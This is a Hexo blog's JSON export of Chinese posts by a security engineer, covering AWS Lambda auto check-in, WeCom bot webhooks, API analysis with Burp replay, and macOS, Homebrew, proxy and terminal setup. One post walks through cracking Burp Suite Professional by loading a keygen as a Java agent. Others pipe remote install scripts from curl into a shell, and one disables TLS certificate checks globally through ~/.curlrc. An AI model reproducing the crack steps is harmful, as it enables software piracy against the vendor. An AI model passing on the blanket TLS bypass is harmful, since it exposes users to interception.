{"meta":{"title":"xiabee-瞎哔哔","subtitle":"总有一些更重要的事情，赋予我们打败恐惧的勇气","description":"","author":"xiabee","url":"https://blog.xiabee.cn","root":"/"},"pages":[{"title":"About Me","date":"2022-07-25T11:39:57.000Z","updated":"2022-08-13T16:44:46.418Z","comments":true,"path":"about/index.html","permalink":"https://blog.xiabee.cn/about/index.html","excerpt":"","text":"Basic Information Undergraduate of Beijing Institute of Technology Majoring in Computer Science and Technology Working in PingCAP, Security Engineer Research Drirections: Web / Cloud Security, SaaS Security, PaaS Securiy, etc Links https://xiabee.cn/cv https://github.com/xiabee"},{"title":"tags","date":"2021-10-25T11:37:50.000Z","updated":"2022-08-13T15:39:31.431Z","comments":true,"path":"tags/index.html","permalink":"https://blog.xiabee.cn/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-10-25T11:32:33.000Z","updated":"2022-08-13T15:39:31.429Z","comments":false,"path":"categories/index.html","permalink":"https://blog.xiabee.cn/categories/index.html","excerpt":"","text":""},{"title":"[404]","date":"2022-08-13T15:39:32.626Z","updated":"2022-08-13T15:39:31.404Z","comments":true,"path":"404.html","permalink":"https://blog.xiabee.cn/404","excerpt":"","text":""}],"posts":[{"title":"使用 AWS Lambda 进行签到","slug":"coding/AWS lambda 入门","date":"2022-12-11T04:00:23.000Z","updated":"2022-12-13T08:37:12.502Z","comments":true,"path":"posts/aws-lambda/","link":"","permalink":"https://blog.xiabee.cn/posts/aws-lambda/","excerpt":"","text":"背景 很久之前做了个基于 AWS Lambda 的 Gladows 的自动签到脚本，一直没有写使用教程，今天来补充一下（不是我鸽，是真的太忙了.jpg） 账号创建啥的太久远了已经忘记怎么操作的了，记忆中不是很难，按照 AWS 官方提示一步一步走就好了 签到架构图： Glados 签到过程分析如下：https://blog.xiabee.cn/posts/glados-intro/ ，想二创的朋友可以看看这篇 什么是 AWS Lambda AWS：Amazon Web Service，中文名叫亚马逊云服务平台，一个做云服务的厂商提供的云服务，类似于国内的阿里云、腾讯云等 Lambda：AWS 提供的一项云服务，是一种 serverless 服务，在不提供完整服务器的前提下让客户实现云计算功能 为什么是 AWS &amp; Serverless Serverless：便宜。选择 serverless 是因为我们没有确切的存储需求，只做签到的话，完全不需要硬盘等设备，只做计算就可以了，这种情况下 serverless 会比 EC2 / VPS 便宜很多； AWS：云服务商很多，但是钱多到可以烧的服务商有限……AWS 是一个对小客户比较友好的一家，完全实现按量收费，绝大多数服务没有基础费用。而且 AWS Lambda 每个月都有很大一定量的免费额度，至少我们这个签到脚本几乎可以一直免费使用，不像某讯云/某里云免费六个月就要开始收基础费用了…… 如图所示：仅使用 Lambda 进行签到，一个月产生的费用 准备工作 最好有一张 Visa 卡，因为 AWS 账号的时候需要绑定银行卡，但是银联应该不行（不记得 Paypal 行不行了，我只有 Visa 所以绑定的是 Visa） 创建一个 AWS 账号，直接创建 root 账号就行，根据官方提示一步一步走，理论上不难（如果你能顺利通过人机验证的话……当时我的验证码一直猜不对） 从安全合规的角度说，使用 root 账号进行配置有安全风险，但是个人用户嘛，暂时先不管那么多，能保证自己的密码 / MFA 不泄漏就已经很不错了……等熟练使用 AWS 之后再来提升安全配置。 创建 lambda 函数进入模块 在控制台左上角搜索 Lambda，找到该功能并进入： 找到右上角 创建函数，如图 运行时设置 注意，因为我们代码用的是 golang，所以运行时选择 Go 1.x 由于 Lambda 不支持 Arm 的 go 运行时，所以我们选择 x86 架构，在最后编译过程中用 x86 进行编译即可 我们代码编译生成的程序是 main，所以这里的处理程序也设置为 main 选择 arm 的报错提示： 编译与上传 这里我们必须使用 x84 架构进行编译： 123# Remember to build your handler executable for Linux!GOOS=linux GOARCH=amd64 go build -o main main.gozip main.zip main 然后把 main.zip 上传至 AWS 代码测试发送空数据包，直接测试代码是否能够运行：正常情况下这里是能执行成功的，但是返回应该是一个“未登录”之类的信息，因为确实没有输入登录信息 设置登录信息 这个签到脚本是利用 cookie 进行登录的，然后通过 Wechatbot 的 webhook 来发送消息，这里不详细解释二者原理了，只介绍一下怎么设置。 代码中通过环境变量来读取上述两个值 这里我们把 COOKIE 和 WECHAT_KEY 的键值对写进 AWS Lambda 的环境变量中，注意大小写 注意，把敏感信息写入环境变量不是 AWS 最佳安全实践的做法，如果有条件的话，最好使用 KMS 进行操作，防止 Lambda 角色账号被拿下后，攻击者能够直接看到更高级别的敏感信息； 但是我们已经是使用 root 账号登录的了……如果这个账号被拿下了基本上没救了（划掉） 不知道如何获取 cookie 的朋友可以看看 GitHub 的另一个仓库 wechatbot 非必须，想加的话可以参考这篇博客 设置完成后再次进行代码测试，应该会在日志中看到签到信息。 设置触发器签到功能，那当然得是每天自动执行啊……AWS 提供一个名为 EventBridge 的触发器，可以设置定时执行 创建触发器 直接 添加触发器（这里我已经添加好了，就不重复添加了） 根据提示完成基础设置，最后设置 “规则”，“创建规则” 设置触发规则 计划模式，在特定时间触发。填写完成后会有详细的提示，告诉你 Cron 表达式所表示的具体日期，对 Cron 小白也很友好（划掉） 选择目标 将目标设置为刚刚创建的 Lambda 函数 此时全部设置已经完成，最终架构如下： 小结 Serverless 可以做的事情很多，这里只是简单举了个签到的例子 AWS 按量付费，免费额度比较多，适合个体发烧友 本文使用 root 账号登录、环境变量中存储敏感信息不符合 AWS 最佳安全实践……但是就这样吧，以后再来写如何安全且规范的使用 AWS","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"serverless","slug":"serverless","permalink":"https://blog.xiabee.cn/tags/serverless/"}]},{"title":"利用企业微信机器人推送消息","slug":"coding/企业微信机器人","date":"2022-10-21T04:00:23.000Z","updated":"2022-11-01T08:10:04.757Z","comments":true,"path":"posts/wechat-bot/","link":"","permalink":"https://blog.xiabee.cn/posts/wechat-bot/","excerpt":"","text":"背景最近在研究云服务，Serverless 这些，有些程序已经实现完全自动化运行了，但是返回的结果要反复查看云服务日志或者个人邮箱，非常麻烦。于是决定写一个能自动给手机发送消息的东西——毕竟能时刻在线的，害得是手机（x） 不同的软件有不同的接口，找到对应的接口文档即可。因为我用微信用的最多，这里就先介绍一下如何使用微信进行消息的自动接收。 PS：为什么是接收不是收发呢……因为腾讯在某天之后限制了自建应用的 IP，必须使用白名单，Serverless 这种连主机都碰不到的玩意就别想固定 IP 了……所以暂时先利用不需要绑定 IP 的企业微信机器人，来实现我们传递云服务反馈的功能。 准备工作 需要准备一个实名认证过的微信 利用该微信注册一个企业微信 下载企业微信客户端，需要在客户端内进行相关设置 创建群机器人 企业创建完成后，会自动创建一个全员群，这个时候只有你自己在里面。这也是你加其他人进来之前唯一的可以加机器人的地方（千万不要像我一样傻愣愣的把群删掉，然后加不了机器人……） 创建机器人后，会得到一个webhook 地址，我们可以参考官方提供的文档，利用 webhook，让机器人自动在群里推送消息 官方文档如下： 验证群机器人12345678910curl &#x27;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=693axxx6-7aoc-4bc4-97a0-0ec2sifa5aaa&#x27; \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27; &#123; &quot;msgtype&quot;: &quot;text&quot;, &quot;text&quot;: &#123; &quot;content&quot;: &quot;hello world&quot; &#125; &#125;&#x27;# 将上面的 key 换成自己的 webhook 里面的 key 企业微信的结果如下：执行成功 如果要自定义消息内容，只需要在程序里写好，然后用上面的 json 格式发送 POST 包就行～ 绑定个人微信如果不常用企业微信，可以把企业微信的消息同步到个人微信中，具体操作如下： 在网页端进入企业微信管理后台 ➡️ 我的企业 ➡️ 微信插件 ➡️ 邀请关注 绑定后，个人微信就可以收到企业微信的消息啦——企业微信，卸载！（划掉） 其他如果想尝试自建应用来推送消息的可以参考官方文档：（比较折腾，尤其是 IP 白名单的问题，我放弃这个了） https://developer.work.weixin.qq.com/document/path/90372 https://developer.work.weixin.qq.com/document/path/91039","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"serverless","slug":"serverless","permalink":"https://blog.xiabee.cn/tags/serverless/"}]},{"title":"Glados 签到简介","slug":"coding/glados 简介","date":"2022-10-20T04:00:23.000Z","updated":"2022-10-26T15:33:19.971Z","comments":true,"path":"posts/glados-intro/","link":"","permalink":"https://blog.xiabee.cn/posts/glados-intro/","excerpt":"","text":"GLADOS 是什么简单来说是一个代理池供应商，具体作用为隐藏真实IP、防溯源等，是安全从业者必不可少的工具之一。 项目地址：Github 注册地址：在项目地址中时时更新 注册邀请码：EEXLM-SZMDH-NJT3P-9NA4V （你用我的邀请码咱俩都可以多白嫖一天） 为什么是 GLADOS因为白嫖很快乐。 GLADOS 有教育计划，如果你还没有毕业，可以用学生邮箱免费试用一年 如果是付费用户，每日签到可以延长一天会员时间，理论上说坚持签到可以一直免费续杯（划掉） 如何进行签到其实本文只是想介绍一下常见 API 的分析方法，并没有摁推的意思。这里我们主要通过 BurpSuite 进行签到抓包，分析具体的请求过程，为后续编写自动化签到程序做铺垫。 手动签到进入主页 ➡️ （登录） ➡️ 首页（往下翻） ➡️ 我的会员 ➡️ 会员签到，然后就发现签到成功啦 签到分析请求流程打开 BurpSuite，拦截上述签到过程发送的数据包，可以看到有两次 http 请求： POST /api/user/checkin GET /api/user/status 直接重放两个包都丢进 Repeater 里面进行重放攻击分析。 可以看出，第一个请求是进行签到的，返回了签到的结果： 第二个请求是获取当前会员信息的，主要包括注册邮箱、当前剩余天数等： 修改后重放为了确定哪些 header 或者数据是有用的，我们可以把其中某个 header 或数据去掉进行重放，看返回结果是否正常，这里以第一个请求为例，第二个请求同理 删除 Cookie返回 code 为 -2，message 为 “没有权限” 删除 token返回 code 为 1 ， message 为 oops, token error 删除 Authorization好像没啥影响…… 签到结论 在签到请求中，必须要添加的 header 是 Cookie ，必须要添加的数据是 token 在查询请求中，必须要添加的 header 是 Cookie 其他其实自动化签到脚本已经写好了，后续有时间再来介绍如何使用（划掉） 基于 GitHub Action 的签到：https://github.com/xiabee/glados-checkin 基于 AWS Lambda 的签到：https://github.com/xiabee/aws-glados-checkin","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"glados","slug":"glados","permalink":"https://blog.xiabee.cn/tags/glados/"}]},{"title":"Mac 环境配置(4)——BurpSuite 破解","slug":"mac/mac 安装 BurpSuite","date":"2022-09-30T04:00:23.000Z","updated":"2022-10-26T14:21:36.676Z","comments":true,"path":"posts/mac-bp/","link":"","permalink":"https://blog.xiabee.cn/posts/mac-bp/","excerpt":"","text":"简介 Burp Suite：懂得都懂，不解释了 一款非常流行的应用层抓包工具，做 WEB 安全的人应该都见过，至少都听说过 下载与安装Burp Suite 下载地址：https://portswigger.net/burp/releases Windows : 需要下载jar 文件，通过启动器同时启动注册机和主体文件 Mac : 直接官网下载官方安装包进行安装即可，后文介绍如何注入注册机 注册机下载地址：https://github.com/h3110w0r1d-y/BurpLoaderKeygen 注入注册机移动注册机 将下载的注册机 BurpLoaderKeygen.jar 放到 Burp Suite 的app 目录内 具体位置：/Applications/Burp Suite Professional.app/Contents/Resources/app 修改 vmoptions添加以下内容： 1234-Dfile.encoding=utf-8-noverify-javaagent:BurpLoaderKeygen.jar -Xmx2048m 运行注册机添加完成后，打开终端，先使用注册机加载 BP 运行注册一下： 12cd &quot;/Applications/Burp Suite Professional.app/Contents/Resources/app&quot;&quot;/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java&quot; -jar BurpLoaderKeygen.jar 注册完成后就可以应该直接正常启动了（如果遇到系统信任的问题，进系统设置里面信任即可） 其他配置SSL 证书等问题暂时先不写了，有空再来更新（划掉） 也可以直接参考国光大佬的博客（膜） Reference https://www.sqlsec.com/2019/11/macbp.html https://github.com/h3110w0r1d-y/BurpLoaderKeygen","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"mac","slug":"mac","permalink":"https://blog.xiabee.cn/tags/mac/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.xiabee.cn/tags/ctf/"}]},{"title":"Mac 环境配置(3)——配置代理","slug":"mac/mac 配置代理","date":"2022-08-24T04:15:23.000Z","updated":"2022-08-24T15:25:38.508Z","comments":true,"path":"posts/mac-proxy/","link":"","permalink":"https://blog.xiabee.cn/posts/mac-proxy/","excerpt":"","text":"概述本篇不介绍如何搭建 VPN，仅介绍如何让 MacOS 的控制台连接到代理服务器，代理其应用层流量。 代理池：Glados 代理工具：Clashx 代理服务器：127.0.0.1 代理端口：7890 终端代理点击图标，可以看到“复制终端代理命令” 复制内容如下： 1export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 设置代理把上述命令复制粘贴到终端里就可以了…… 但是作为懒狗，每次输入这么多命令怎么行——直接修改 ~/.zshrc（没装 zsh 的话可以修改 ~/.bash_profile），在文件末添加以下内容，设置快捷命令： 123456789101112function proxy() &#123; export http_proxy=http://127.0.0.1:7890 export https_proxy=http://127.0.0.1:7890 export all_proxy=socks5://127.0.0.1:7890 echo -e &quot;Proxy Server is running on 127.0.0.1:7890&quot;&#125;function unproxy()&#123; unset http_proxy https_proxy all_proxy echo -e &quot;Proxy is unset&quot;&#125;# 设置两个函数是为了同时方便“开”和“关”，不需要关代理的话只写&quot;proxy&quot;函数即可 修改完成后，重载配置文件即可：source ~/.zshrc 效果如下： 开启代理1234proxy# 开启终端代理curl -I https://www.google.com -k# 访问谷歌 返回 200 则说明访问成功，代理有效： 123456789101112131415HTTP/1.1 200 Connection establishedHTTP/2 200content-type: text/html; charset=ISO-8859-1p3p: CP=&quot;This is not a P3P policy! See g.co/p3phelp for more info.&quot;date: Wed, 24 Aug 2022 15:11:26 GMTserver: gwsx-xss-protection: 0x-frame-options: SAMEORIGINexpires: Wed, 24 Aug 2022 15:11:26 GMTcache-control: privateset-cookie: 1P_JAR=2022-08-24-15; expires=Fri, 23-Sep-2022 15:11:26 GMT; path=/; domain=.google.com; Secureset-cookie: AEC=AakniGNoleB5QDOweRF8cAPBYO0XgdWWscKIH6sfpYd2rCtWCXcktNLnNBo; expires=Mon, 20-Feb-2023 15:11:26 GMT; path=/; domain=.google.com; Secure; HttpOnly; SameSite=laxset-cookie: NID=511=aPwxMWt8AQkAUPuU_WaVeDB8yxcXJ7asmgq2AA2JxFYPjZPoIkafjkR-FtpwH7VS-FJvJIApeW3wbKPEMTWn2vZXRJlAj3uPJF4KI_DpollKV66qceyhpm3gxQUgc7zjlc48H7m9FPZA_9rwd8HE67C9WQfr1VyF81iIINtW-S4; expires=Thu, 23-Feb-2023 15:11:26 GMT; path=/; domain=.google.com; HttpOnlyalt-svc: h3=&quot;:443&quot;; ma=2592000,h3-29=&quot;:443&quot;; ma=2592000,h3-Q050=&quot;:443&quot;; ma=2592000,h3-Q046=&quot;:443&quot;; ma=2592000,h3-Q043=&quot;:443&quot;; ma=2592000,quic=&quot;:443&quot;; ma=2592000; v=&quot;46,43&quot; 关闭代理1234unproxy# 关闭代理curl -I https://www.google.com -k# 再次访问谷歌，很慢甚至直接超时 测试说明 Q：为什么不用 ping 来做测试 A：注意，这里用到的 clashX 仅代理了 应用层 http 协议和传输层 socks5 协议的流量；而 MacOS 原生的 ping 命令使用的是 ICMP 协议，属于网络层，没有经过传输层和应用层的代理，所以直接在命令行里面 ping 是不能测试代理是否成功的。 所以使用 curl -I 来进行应用层的测试。 浏览器代理推荐使用 Proxy SwitchOmega，直接设置相应情景即可：","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"mac","slug":"mac","permalink":"https://blog.xiabee.cn/tags/mac/"},{"name":"brew","slug":"brew","permalink":"https://blog.xiabee.cn/tags/brew/"}]},{"title":"Mac 环境配置(2)——homebrew","slug":"mac/mac-homebrew","date":"2022-08-23T04:00:23.000Z","updated":"2022-08-23T09:19:24.735Z","comments":true,"path":"posts/mac-brew/","link":"","permalink":"https://blog.xiabee.cn/posts/mac-brew/","excerpt":"","text":"Homebrew 简介 官网：https://brew.sh/ 可以理解为 MacOS 的包管理器，利用 brew 等命令实现一键安装各类软件与依赖。 新款 MacOS 应该已经预装了，如果没有的话可以参考安装部分。 安装需要在终端中安装，如果没有配置终端可以参考上篇。 终端配置完毕后，直接在终端内执行以下命令： 1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 安装不难，如果你能顺利解决一些BUG的话（x） 常见问题curl SSL12curl: (60) SSL certificate problem: self signed certificate in certificate chainMore details here: https://curl.se/docs/sslcerts.html 问题描述：自签名证书不被信任，无法使用 curl 解决方案：这个没有太好的解决方案，要么重装一个受信任的证书，要么使用 -k 参数忽略 https证书校验 这里我们选择忽略校验，即直接把前述命令改为： 1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh -k)&quot; 也可以选择一种一劳永逸的忽略校验的方法：创建一个配置文件 ~/.curlrc， 内容为 --insecure 网络问题由于一些众所周知的原因，GitHub 在没有代理的时候会很难上。 换源安装这里我们直接把他改成清华源，利用国内镜像下载安装。 官方文档：https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ 123456789101112xcode-select --install# 安装 xcode-selectexport HOMEBREW_BREW_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&quot;export HOMEBREW_CORE_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&quot;export HOMEBREW_BOTTLE_DOMAIN=&quot;https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles&quot;# 设置环境变量git clone --depth=1 https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/install.git brew-install/bin/bash brew-install/install.shrm -rf brew-install# 从本镜像下载安装脚本并安装 Homebrew / Linuxbrew 替换仓库上游替换 brew 程序本身的源 12345678910111213141516171819export HOMEBREW_BREW_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&quot;brew update# 手动设置export HOMEBREW_CORE_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&quot;brew tap --custom-remote --force-auto-update homebrew/core https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.gitbrew tap --custom-remote --force-auto-update homebrew/cask https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.gitbrew tap --custom-remote --force-auto-update homebrew/cask-fonts https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-fonts.gitbrew tap --custom-remote --force-auto-update homebrew/cask-drivers https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-drivers.gitbrew tap --custom-remote --force-auto-update homebrew/cask-versions https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-versions.gitbrew tap --custom-remote --force-auto-update homebrew/command-not-found https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-command-not-found.gitbrew update# 或使用下面的几行命令自动设置export HOMEBREW_CORE_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&quot;for tap in core cask&#123;,-fonts,-drivers,-versions&#125; command-not-found; do brew tap --custom-remote --force-auto-update &quot;homebrew/$&#123;tap&#125;&quot; &quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-$&#123;tap&#125;.git&quot;donebrew update 注：如果用户设置了环境变量 HOMEBREW_BREW_GIT_REMOTE 和 HOMEBREW_CORE_GIT_REMOTE，则每次执行 brew update 时，brew 程序本身和 Core Tap (homebrew-core) 的远程将被自动设置。推荐用户将这两个环境变量设置加入 shell 的 profile 设置中。 1234567test -r ~/.bash_profile &amp;&amp; echo &#x27;export HOMEBREW_BREW_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&quot;&#x27; &gt;&gt; ~/.bash_profile # bashtest -r ~/.bash_profile &amp;&amp; echo &#x27;export HOMEBREW_CORE_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&quot;&#x27; &gt;&gt; ~/.bash_profiletest -r ~/.profile &amp;&amp; echo &#x27;export HOMEBREW_BREW_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&quot;&#x27; &gt;&gt; ~/.profiletest -r ~/.profile &amp;&amp; echo &#x27;export HOMEBREW_CORE_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&quot;&#x27; &gt;&gt; ~/.profiletest -r ~/.zprofile &amp;&amp; echo &#x27;export HOMEBREW_BREW_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&quot;&#x27; &gt;&gt; ~/.zprofile # zshtest -r ~/.zprofile &amp;&amp; echo &#x27;export HOMEBREW_CORE_GIT_REMOTE=&quot;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&quot;&#x27; &gt;&gt; ~/.zprofile 复原仓库上游1234567891011121314# brew 程序本身，Homebrew / Linuxbrew 相同unset HOMEBREW_BREW_GIT_REMOTEgit -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew# 以下针对 macOS 系统上的 Homebrewunset HOMEBREW_CORE_GIT_REMOTEBREW_TAPS=&quot;$(BREW_TAPS=&quot;$(brew tap 2&gt;/dev/null)&quot;; echo -n &quot;$&#123;BREW_TAPS//$&#x27;\\n&#x27;/:&#125;&quot;)&quot;for tap in core cask&#123;,-fonts,-drivers,-versions&#125; command-not-found; do if [[ &quot;:$&#123;BREW_TAPS&#125;:&quot; == *&quot;:homebrew/$&#123;tap&#125;:&quot;* ]]; then # 只复原已安装的 Tap brew tap --custom-remote &quot;homebrew/$&#123;tap&#125;&quot; &quot;https://github.com/Homebrew/homebrew-$&#123;tap&#125;&quot; fidonebrew update 注：重置回默认远程后，用户应该删除 shell 的 profile 设置中的环境变量 HOMEBREW_BREW_GIT_REMOTE 和 HOMEBREW_CORE_GIT_REMOTE 以免运行 brew update 时远程再次被更换。 最终效果 brew 常见用法12345678910brew update# 更新源brew upgrade# 下载更新brew search xxxx# 搜索 xxxxbrew install xxxx# 安装 xxxxbrew remove xxxx# 卸载 xxxx 更多用法参考官方文档 Reference https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ https://docs.brew.sh/","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"mac","slug":"mac","permalink":"https://blog.xiabee.cn/tags/mac/"},{"name":"brew","slug":"brew","permalink":"https://blog.xiabee.cn/tags/brew/"}]},{"title":"Mac 环境配置(1)——完美终端","slug":"mac/mac 环境配置","date":"2022-08-16T04:00:23.000Z","updated":"2022-08-20T08:48:57.028Z","comments":true,"path":"posts/mac-init/","link":"","permalink":"https://blog.xiabee.cn/posts/mac-init/","excerpt":"","text":"环境说明公司发了新电脑，M1 Pro 的 MacBook Pro，用了几天体验还不错，参考 makeoptim 配置了一下自己的终端。 这里介绍一下怎么在 Mac 里打造一个能让颜狗落泪的漂亮终端（划掉） “完美”标准 我是颜狗，终端好看是第一标准 自动补全应该是一个终端的必备需求 最好有语法高亮 最好能通过键盘唤醒 大概长这样： 准备工作需要安装一些软件 / 字体等 字体后面会用到 p10k 相关字体，前往 https://github.com/romkatv/powerlevel10k#manual-font-installation 下载并安装 MesloLGS NF Regular.ttf 即可。 iTerm2下载与安装一个终端工具，新款的 Mac 应该有预装，如果没有的话可以去官网下载安装一个。 在 Application 目录下，找不到的话也可以 command + [space] 进行查找： 完全磁盘访问权限 注：建议为 iTerm2 打开完全磁盘访问权限，避免出现默认 Terminal 能够执行正确，iTerm2 因为权限问题导致执行有误的情况。 左上角苹果图标 ➡️ 系统偏好设置 系统偏好设置 ➡️ 安全性与隐私 ➡️ 隐私 ➡️ 完全磁盘访问权限 ➡️ iTerm 设置背景 点击屏幕左上角 iTerm2 ➡️ Preferences ➡️ Profiles ➡️ Profile Name选中对应配置文件 ➡️ Window ➡️ Background Image zshMac 系统默认安装了 zsh ，用以下命令把默认 Shell 改成 zsh 就行： 1chsh -s /bin/zsh oh-my-zsh Oh My Zsh is a delightful, open source, community-driven framework for managing your Zsh configuration. It comes bundled with thousands of helpful functions, helpers, plugins, themes, and a few things that make you shout… ohmyzs.sh 下载与安装Oh-my-zsh 官方支持 curl 和 wget 两种方式安装，看 Mac 里面安装了哪个工具就用哪个 后续再来介绍如何配置 homebrew 并利用 brew 来安装软件 12345sh -c &quot;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;# 用 curl 安装sh -c &quot;$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)&quot;# 用 wget 安装 命令执行成功后，不需要配置，直接把 oh-my-zsh 安装在 ~/.oh-my-zsh 目录下，并载入默认配置： 切换主题修改主题则只需要修改 ~/.zshrc 中的 ZSH_THEME=&quot;&quot; 字段，并将相应主题下载到 ~/.oh-my-zsh/themes 中： Powerlevel10k俗称 p10k，是目前 Oh-my-zsh 里面最流行的主题之一，也是我最喜欢的一个主题 因为懒癌晚期，不喜欢自己定制配置文件，直接跑别人写好的定制脚本就行 下载与安装12git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/themes/powerlevel10k# git 一键安装 修改 zsh 配置文件修改之前最好提前安装前述的 MesloLGS NF Regular.ttf 字体。 如上述，修改 ~/.zshrc 文件，将主题字段改为 ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot; 然后保存退出，重新载入配置文件： 1source ~/.zshrc 重载配置文件后，会自动启动 p10k 的安装程序： 重置 p10k如果上一次写入配置文件成功，直接执行以下命令，重新配置主题： 1p10k configure 如果写入配置文件不成功，重载 zsh 配置文件，重新启动 p10k 的安装程序： 1source ~/.zshrc 插件配置这部分不是必须，但是可以让终端更好看 ✅ 部分插件需要用到 homewbrew，后续文章会详细介绍 homebrew（下次一定写，这次先鸽了x） autojumpautojump 可以记录下之前 cd 命令访过的所有目录，下次要去那个目录时不需要输入完整的路径，直接 j somedir 即可到达，甚至那个目标目录的名称只输入开头即可，实现了目录的自动补全。 下载与安装有两种常见的安装方式，包管理器安装和源码安装： 包管理器 brew 安装： 1brew install autojump 源码安装：详情可见官网 123git clone git://github.com/wting/autojump.gitcd autojump./install.py 配置在 zsh 的配置文件 ~/.zshrc 中的 plugins 中加入 autojump。 然后重载 ~/.zshrc ，启用插件 1source ~/.zshrc zsh-syntax-highlightingzsh-syntax-highlighting 终端命令语法高亮插件。 执行以下命令，安装 zsh-syntax-highlighting 1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting 安装后，如上述，修改 ~./zshrc ， 在plugins 中加入 zsh-syntax-highlighting，并重载 ~./zshrc。 zsh-autosuggestionszsh-autosuggestions 终端命令自动推荐插件，会记录之前使用过的命令，当你输入开头时，会暗色提示之前的历史命令供你选择，可直接按右方向键选中该命令。 执行以下命令，安装zsh-autosuggestions。 1git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions 安装后，如上述，修改 ~./zshrc ， 在plugins 中加入 zsh-autosuggestions，并重载 ~./zshrc。 VSCode 相关默认情况下，在 VSCode 中选择 zsh 作为默认 Shell 会出现乱码现象。原因是 Oh My Zsh 配置完成后，使用了 MesloLGS NF 字体。 因此，修复乱码只需要在设置中找到 terminal font，设置成 MesloLGS NF 即可。 command + , 打开设置 ➡️ 搜索 terminal font ➡️ 修改字体为 MesloLGS NF 最终效果iTerm: VScode: Reference https://makeoptim.com/tool/terminal","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"mac","slug":"mac","permalink":"https://blog.xiabee.cn/tags/mac/"},{"name":"brew","slug":"brew","permalink":"https://blog.xiabee.cn/tags/brew/"}]},{"title":"Hexo 本地迁移","slug":"coding/Hexo-本地迁移","date":"2022-08-14T04:00:23.000Z","updated":"2022-08-15T09:29:08.423Z","comments":true,"path":"posts/hexo-transfer-issue/","link":"","permalink":"https://blog.xiabee.cn/posts/hexo-transfer-issue/","excerpt":"","text":"前置知识 利用 hexo 和 gitpage 搭建博客：https://blog.xiabee.cn/posts/hexo-git-setup/ 利用 git 分支进行源码备份：https://blog.xiabee.cn/posts/hexo-git-backup/ 利用 algolia 启用全文搜索：https://blog.xiabee.cn/posts/archer-algolia/ 迁移过程 起因：工作电脑换成了 MacBookPro，原来写博客的电脑正式退役，只用来打游戏（x） 现状：GitHub 上的 hero_backup 分支保存了需要的源码文件，本地电脑什么文件都没有 本地电脑已安装 git, homebrew 等工具 源码下载12345678git clone git@github.com:xiabee/xiabee.github.io.git# 克隆 GitPage 的仓库到本地，此时是展示 Page 页面的主分支cd xiabee.github.iogit checkout hexo_backup# 切换到源码备份分支git pull# 下载源码 环境安装 这里用的是 M1 Pro MacbookPro，并且安装了 homebrew 其他环境参考 前述博客 的“迁移与复原”部分 12345678brew updatebrew install hexo# 在本地安装 hexocd xiabee.github.io# 进入仓库目录npm install# 安装相关依赖 故障排查页面渲染失败问题描述 hexo g -d 之后，博客全白，什么也没有 解决方案 检查一下备份文件里面有没有备份主题文件……没有的话重新下载一下主题文件，然后重新 hexo g db.json 读写有问题问题描述 ERROR Database load failed. Deleting database. ​ 读取数据库文件 db.json 失败，删除了 db.json 